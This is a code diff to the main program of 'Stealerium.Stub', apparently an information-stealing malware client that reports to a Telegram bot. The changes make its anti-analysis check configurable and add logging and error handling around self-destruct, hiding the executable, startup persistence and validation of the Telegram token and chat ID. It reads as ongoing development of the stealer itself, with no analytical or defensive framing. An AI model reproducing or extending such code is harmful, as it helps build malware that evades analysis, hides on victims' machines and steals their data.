@@ -1,8 +1,6 @@
-﻿using System;
-using System.Diagnostics;
+using System;
 using System.IO;
 using System.Net;
-using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 using Stealerium.Stub.Helpers;
@@ -26,35 +24,80 @@ namespace Stealerium.Stub
             ServicePointManager.DefaultConnectionLimit = 9999;
 
             // Run AntiAnalysis modules first
-            if (AntiAnalysis.Run())
+            if (Config.AntiAnalysis == "1")
             {
-                Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
-                SelfDestruct.Melt();
+                if (AntiAnalysis.Run())
+                {
+                    Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
+                    SelfDestruct.Melt();
+                }
             }
 
             // Mutex check (to avoid running multiple instances)
             MutexControl.Check();
+            Logging.Log("Program: Mutex check completed.");
 
             // Initialize configuration
-            Task.Run(Config.InitAsync).Wait();
+            Logging.Log("Program: Starting configuration initialization...");
+            try 
+            {
+                await Task.Run(Config.InitAsync);
+                Logging.Log("Program: Configuration initialized successfully.");
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Program: Failed to initialize configuration: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw; // Re-throw to ensure the program exits
+            }
+
+            // Change working directory to appdata
+            Logging.Log("Program: Changing working directory...");
+            Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
             // Hide executable on first start
-            if (!Startup.IsFromStartup())
-                Startup.HideFile();
+            try 
+            {
+                Logging.Log("Program: Starting startup check...");
+                var isFromStartup = Startup.IsFromStartup();
+                Logging.Log($"Program: Checking if running from startup: {isFromStartup}");
+                
+                if (!isFromStartup)
+                {
+                    Logging.Log("Program: Not running from startup, hiding file...");
+                    Startup.HideFile();
+                    Logging.Log("Program: File hidden successfully");
+                }
+                else
+                {
+                    Logging.Log("Program: Already running from startup, skipping hide");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Program: Error during startup check/file hiding: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw;
+            }
 
             // If Telegram API or ID is invalid, self-destruct
-            if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
+            try
             {
-                Logging.Log("SelfDestruct triggered because Telegram API or Telegram ID is invalid.");
-                SelfDestruct.Melt();
+                Logging.Log("Program: Checking Telegram configuration...");
+                if (Config.TelegramAPI.Contains("---") || Config.TelegramID.Contains("---"))
+                {
+                    Logging.Log("Program: Invalid Telegram configuration, initiating self-destruct");
+                    SelfDestruct.Melt();
+                }
+                Logging.Log("Program: Telegram configuration is valid");
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Program: Error checking Telegram configuration: {ex.Message}\nStack trace: {ex.StackTrace}");
+                throw;
             }
 
             // Start delay (if configured)
             if (Config.StartDelay == "1")
                 StartDelay.Run();
-
-            // Change working directory to appdata
-            Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
             // Test Telegram API token
             if (!await Telegram.TokenIsValidAsync().ConfigureAwait(false))
